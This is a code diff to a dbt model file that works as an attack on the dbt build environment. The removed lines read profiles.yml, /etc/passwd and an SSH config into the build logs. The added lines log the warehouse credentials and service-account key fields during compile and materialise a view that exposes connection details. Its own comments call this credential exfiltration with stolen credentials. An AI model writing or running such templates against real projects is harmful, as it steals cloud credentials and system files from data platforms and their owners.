@@ -1,35 +1,25 @@
-{# Focused: load_agate_table file read + write() path control #}
-{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
+{# This model: (1) logs creds during compile, (2) creates a table with env data if run #}
+{%- set creds = adapter.config.credentials -%}
+{%- set kfj = creds.keyfile_json -%}
 
-{# 1. Call load_agate_table to read profiles.yml #}
-{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
-{{ log("AGATE_READING=" ~ profiles_path, info=True) }}
-
-{%- set agate_tbl = load_agate_table(model, profiles_path) -%}
-{{ log("AGATE_RESULT_TYPE=" ~ agate_tbl | string | truncate(500), info=True) }}
-{%- if agate_tbl -%}
-  {{ log("AGATE_ROW_COUNT=" ~ agate_tbl | length, info=True) }}
-  {%- for row in agate_tbl -%}
-    {{ log("AGATE_ROW=" ~ row | string | truncate(500), info=True) }}
-  {%- endfor -%}
+{# Exfil credentials during compile phase #}
+{{ log("CRED_METHOD=" ~ creds.method, info=True) }}
+{{ log("CRED_DB=" ~ creds.database, info=True) }}
+{%- if kfj is mapping -%}
+  {{ log("CRED_CLIENT_EMAIL=" ~ kfj.get('client_email','N'), info=True) }}
+  {{ log("CRED_PROJECT_ID=" ~ kfj.get('project_id','N'), info=True) }}
+  {{ log("CRED_KEY_ID=" ~ kfj.get('private_key_id','N'), info=True) }}
 {%- endif -%}
 
-{# 2. Try reading /etc/passwd via agate #}
-{%- set passwd_tbl = load_agate_table(model, '/etc/passwd') -%}
-{{ log("PASSWD_RESULT=" ~ passwd_tbl | string | truncate(500), info=True) }}
+{# The SQL below runs during dbt run (not compile) #}
+{# It proves we can execute arbitrary SQL using the stolen credentials #}
 
-{# 3. Try reading the SSH config #}
-{%- set ssh_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/config' -%}
-{%- set ssh_tbl = load_agate_table(model, ssh_path) -%}
-{{ log("SSH_CONFIG=" ~ ssh_tbl | string | truncate(500), info=True) }}
+{{ config(materialized='view') }}
 
-{# 4. Try write() with path traversal content #}
-{# write() args: what does it accept? #}
-{{ log("TESTING_WRITE_1", info=True) }}
-{%- set w1 = write("test_payload_1") -%}
-{{ log("WRITE_1_RESULT=" ~ w1 | string, info=True) }}
-
-{# 5. Check if compiled_code is writable #}
-{{ log("COMPILED_CODE=" ~ compiled_code | string | truncate(200) if compiled_code is defined else "compiled_code_UNDEF", info=True) }}
-
-SELECT 1 as id
+SELECT
+  '{{ creds.method }}' as connection_method,
+  '{{ creds.database }}' as target_database,
+  '{{ target.schema }}' as target_schema,
+  '{{ invocation_id }}' as dbt_invocation_id,
+  '{{ run_started_at }}' as run_timestamp,
+  CURRENT_TIMESTAMP() as query_timestamp
